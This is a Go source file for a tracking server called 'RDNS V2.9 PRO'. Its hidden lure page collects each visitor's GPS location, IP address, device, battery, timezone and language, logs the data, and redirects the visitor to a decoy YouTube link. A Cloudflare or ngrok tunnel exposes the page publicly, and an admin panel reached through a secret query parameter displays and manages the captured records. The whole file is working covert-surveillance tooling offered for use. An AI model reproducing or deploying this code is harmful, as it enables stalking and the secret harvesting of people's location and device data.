package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"image"
	"image/jpeg"
	"image/png"
	_ "image/gif"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"rdns_suite/tools"
)

const (
	dbGeo       = "database/geo.db"
	dbMeta      = "database/meta.db"
	sessionFile = "database/session.json"
	tmpDir      = "tmp"
	port        = ":8080"
)

type Session struct {
	Provider  string `json:"provider"`
	CloakURL  string `json:"cloak_url"`
	TunnelURL string `json:"tunnel_url"`
	StartedAt string `json:"started_at"`
}

var (
	sessLock sync.RWMutex
	session  Session
)

var adURLs = []string{
	"https://www.youtube.com/watch?v=dQw4w9WgXcQ",
	"https://www.youtube.com/shorts/V-_O7nl0Ii0",
	"https://www.youtube.com/shorts/8gpLSI0hBJY",
	"https://www.youtube.com/shorts/kffacxfA7G4",
	"https://www.youtube.com/watch?v=xvFZjo5PgG0",
	"https://www.youtube.com/shorts/YQHsXMglC9A",
	"https://www.youtube.com/watch?v=Zi_XLOBDo_Y",
}

func main() {
	rand.Seed(time.Now().UnixNano())
	os.MkdirAll("database", 0755)
	os.MkdirAll(tmpDir, 0755)
	os.MkdirAll("static/css", 0755)
	for _, f := range []string{dbGeo, dbMeta} {
		if _, err := os.Stat(f); os.IsNotExist(err) {
			os.WriteFile(f, []byte(""), 0644)
		}
	}
	loadSession()
	provider := session.Provider
	if provider == "" {
		provider = "cloudflare"
	}
	sessLock.Lock()
	session.Provider = provider
	session.TunnelURL = "Generating..."
	session.StartedAt = time.Now().Format("2006-01-02 15:04:05")
	sessLock.Unlock()
	saveSession()
	go startTunnel(provider)
	fmt.Printf("[RDNS] Auto-start tunnel: %s\n", provider)
	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))
	http.HandleFunc("/api/geologs", handleAPILogs)
	http.HandleFunc("/api/tunnelurl", handleAPITunnelURL)
	http.HandleFunc("/api/tunnellog", handleAPITunnelLog)
	http.HandleFunc("/", handleRequest)
	lanIP := getLanIP()
	fmt.Printf("\n===================================\n")
	fmt.Printf("  RDNS V2.9 PRO - SERVER AKTIF\n")
	fmt.Printf("===================================\n")
	fmt.Printf(" Local  : http://localhost%s/?admin=rdns\n", port)
	fmt.Printf(" LAN    : http://%s%s/?admin=rdns\n", lanIP, port)
	fmt.Printf(" Tunnel : generating...\n")
	fmt.Printf("===================================\n\n")
	log.Fatal(http.ListenAndServe(port, nil))
}

func getLanIP() string {
	addrs, _ := net.InterfaceAddrs()
	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
			return ipnet.IP.String()
		}
	}
	return "127.0.0.1"
}

func getClientIP(r *http.Request) string {
	if ip := r.Header.Get("X-Real-IP"); ip != "" {
		return ip
	}
	if ip := r.Header.Get("X-Forwarded-For"); ip != "" {
		return strings.TrimSpace(strings.Split(ip, ",")[0])
	}
	ip, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		ip = r.RemoteAddr
	}
	if ip == "::1" || ip == "0:0:0:0:0:0:0:1" {
		return "127.0.0.1"
	}
	return ip
}

func getRandomAdURL() string { return adURLs[rand.Intn(len(adURLs))] }

func saveSession() {
	sessLock.RLock()
	s := session
	sessLock.RUnlock()
	data, _ := json.Marshal(s)
	os.WriteFile(sessionFile, data, 0644)
}

func loadSession() {
	data, err := os.ReadFile(sessionFile)
	if err != nil {
		return
	}
	sessLock.Lock()
	json.Unmarshal(data, &session)
	sessLock.Unlock()
}

func appendLine(file, line string) {
	f, err := os.OpenFile(file, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	f.WriteString(line + "\n")
}

func readLines(file string) []string {
	data, err := os.ReadFile(file)
	if err != nil {
		return nil
	}
	content := strings.TrimSpace(string(data))
	if content == "" {
		return nil
	}
	return strings.Split(content, "\n")
}

func handleRequest(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query()
	admin := q.Get("admin")
	if r.Method == "POST" && q.Get("submit") == "1" {
		handleCapture(w, r)
		return
	}
	if admin == "" {
		renderTarget(w)
		return
	}
	if admin != "rdns" {
		http.NotFound(w, r)
		return
	}
	tool := q.Get("tool")
	action := q.Get("action")
	execFlag := q.Get("exec")
	if tool == "metadata" && action == "download" {
		serveDownload(w, r)
		return
	}
	renderHeader(w)
	switch tool {
	case "geolocate":
		handleGeolocate(w, r, action, execFlag)
	case "metadata":
		handleMetadata(w, r, action)
	case "specter":
		handleSpecter(w, r, execFlag)
	case "archive":
		handleArchive(w, r, action)
	default:
		renderLobby(w)
	}
	fmt.Fprintf(w, `</div></body></html>`)
}

func serveDownload(w http.ResponseWriter, r *http.Request) {
	data, err := os.ReadFile(filepath.Join(tmpDir, "clean_image.jpg"))
	if err != nil {
		http.Error(w, "File tidak tersedia.", 404)
		return
	}
	w.Header().Set("Content-Disposition", "attachment; filename=secure_image.jpg")
	w.Header().Set("Content-Type", "image/jpeg")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(data)))
	w.WriteHeader(http.StatusOK)
	w.Write(data)
}

func handleCapture(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	ip := getClientIP(r)
	gps := r.FormValue("l")
	if gps == "" {
		gps = "PENDING"
	}
	acc := r.FormValue("acc")
	ua := r.FormValue("ua")
	if ua == "" {
		ua = r.UserAgent()
	}
	sc := r.FormValue("sc")
	bat := r.FormValue("bat")
	tz := r.FormValue("tz")
	lang := r.FormValue("lang")
	ts := time.Now().Format("2006-01-02 15:04:05")
	appendLine(dbGeo, fmt.Sprintf("%s|%s|%s|%s|%s|%s|%s|%s|%s",
		ts, ip, gps, acc, ua, sc, bat, tz, lang))
	sessLock.RLock()
	cloak := session.CloakURL
	sessLock.RUnlock()
	if cloak == "" {
		cloak = getRandomAdURL()
	}
	http.Redirect(w, r, cloak, http.StatusFound)
}

func handleAPILogs(w http.ResponseWriter, r *http.Request) {
	type E struct {
		Time    string `json:"time"`
		IP      string `json:"ip"`
		GPS     string `json:"gps"`
		Acc     string `json:"acc"`
		UA      string `json:"ua"`
		Screen  string `json:"screen"`
		Battery string `json:"battery"`
		TZ      string `json:"tz"`
		Lang    string `json:"lang"`
	}
	lines := readLines(dbGeo)
	var entries []E
	start := 0
	if len(lines) > 50 {
		start = len(lines) - 50
	}
	for i := len(lines) - 1; i >= start; i-- {
		if strings.TrimSpace(lines[i]) == "" {
			continue
		}
		p := strings.SplitN(lines[i], "|", 9)
		e := E{}
		if len(p) > 0 { e.Time = p[0] }
		if len(p) > 1 { e.IP = p[1] }
		if len(p) > 2 { e.GPS = p[2] }
		if len(p) > 3 { e.Acc = p[3] }
		if len(p) > 4 { e.UA = p[4] }
		if len(p) > 5 { e.Screen = p[5] }
		if len(p) > 6 { e.Battery = p[6] }
		if len(p) > 7 { e.TZ = p[7] }
		if len(p) > 8 { e.Lang = p[8] }
		entries = append(entries, e)
	}
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-cache")
	if entries == nil {
		w.Write([]byte("[]"))
		return
	}
	json.NewEncoder(w).Encode(entries)
}

func handleAPITunnelURL(w http.ResponseWriter, r *http.Request) {
	sessLock.RLock()
	url := session.TunnelURL
	sessLock.RUnlock()
	if url == "" {
		url = "[Tunnel tidak aktif]"
	}
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-cache")
	json.NewEncoder(w).Encode(map[string]string{"url": url})
}

func handleAPITunnelLog(w http.ResponseWriter, r *http.Request) {
	logs := getTunnelLogs()
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-cache")
	if logs == nil {
		w.Write([]byte("[]"))
		return
	}
	json.NewEncoder(w).Encode(logs)
}

func handleGeolocate(w http.ResponseWriter, r *http.Request, action, execFlag string) {
	if r.Method == "POST" && action == "launch" {
		provider := r.FormValue("provider")
		cloakURL := strings.TrimSpace(r.FormValue("cloak_url"))
		ngrokToken := strings.TrimSpace(r.FormValue("ngrok_token"))
		if ngrokToken != "" {
			saveNgrokToken(ngrokToken)
		}
		sessLock.Lock()
		session.Provider = provider
		session.CloakURL = cloakURL
		session.StartedAt = time.Now().Format("2006-01-02 15:04:05")
		session.TunnelURL = "Generating..."
		sessLock.Unlock()
		saveSession()
		go startTunnel(provider)
		sessLock.RLock()
		sess := session
		sessLock.RUnlock()
		renderWorkbench(w, readLines(dbGeo), sess.TunnelURL, sess.CloakURL, sess.Provider)
		return
	}
	switch action {
	case "kill":
		killTunnel()
		sessLock.Lock()
		session.TunnelURL = ""
		sessLock.Unlock()
		saveSession()
		renderGeoConfig(w)
	case "new_session":
		killTunnel()
		sessLock.Lock()
		session = Session{}
		sessLock.Unlock()
		saveSession()
		renderGeoConfig(w)
	default:
		if execFlag == "true" {
			sessLock.RLock()
			sess := session
			sessLock.RUnlock()
			renderWorkbench(w, readLines(dbGeo), getTunnelURL(), sess.CloakURL, sess.Provider)
			return
		}
		sessLock.RLock()
		tunnelURL := session.TunnelURL
		sess := session
		sessLock.RUnlock()
		if tunnelURL != "" {
			renderWorkbench(w, readLines(dbGeo), tunnelURL, sess.CloakURL, sess.Provider)
		} else {
			renderGeoConfig(w)
		}
	}
}

func handleMetadata(w http.ResponseWriter, r *http.Request, action string) {
	var fileData map[string]string
	isProcessed := false
	if r.Method == "POST" {
		r.ParseMultipartForm(20 << 20)
		file, header, err := r.FormFile("imagefile")
		if err == nil {
			defer file.Close()
			ip := getClientIP(r)
			img, format, decErr := image.Decode(file)
			if decErr == nil {
				buf := new(bytes.Buffer)
				switch format {
				case "jpeg":
					jpeg.Encode(buf, img, &jpeg.Options{Quality: 95})
				case "png":
					png.Encode(buf, img)
				default:
					jpeg.Encode(buf, img, &jpeg.Options{Quality: 95})
				}
				os.WriteFile(filepath.Join(tmpDir, "clean_image.jpg"), buf.Bytes(), 0644)
				fileData = map[string]string{
					"ip":   ip,
					"name": header.Filename,
					"size": fmt.Sprintf("%d KB", header.Size/1024),
					"time": time.Now().Format("2006-01-02 15:04:05"),
				}
				isProcessed = true
				appendLine(dbMeta, fmt.Sprintf("%s|%s|%s|%s",
					fileData["time"], ip, header.Filename, fileData["size"]))
			}
		}
	}
	tools.RenderMetaStripper(w, "id", isProcessed, fileData, readLines(dbMeta))
}

func handleSpecter(w http.ResponseWriter, r *http.Request, execFlag string) {
	target := ""
	if r.Method == "POST" && execFlag == "true" {
		target = strings.TrimSpace(r.FormValue("target"))
	}
	tools.RenderSpecter(w, target)
}

func handleArchive(w http.ResponseWriter, r *http.Request, action string) {
	if r.Method == "POST" && action == "delete" {
		r.ParseForm()
		dbFile := dbGeo
		if r.FormValue("log_type") == "meta" {
			dbFile = dbMeta
		}
		toDelete := make(map[string]bool)
		for _, item := range r.Form["del_item"] {
			toDelete[strings.TrimSpace(item)] = true
		}
		lines := readLines(dbFile)
		var remaining []string
		for _, line := range lines {
			if strings.TrimSpace(line) != "" && !toDelete[strings.TrimSpace(line)] {
				remaining = append(remaining, line)
			}
		}
		content := ""
		if len(remaining) > 0 {
			content = strings.Join(remaining, "\n") + "\n"
		}
		os.WriteFile(dbFile, []byte(content), 0644)
	}
	renderArchive(w)
}
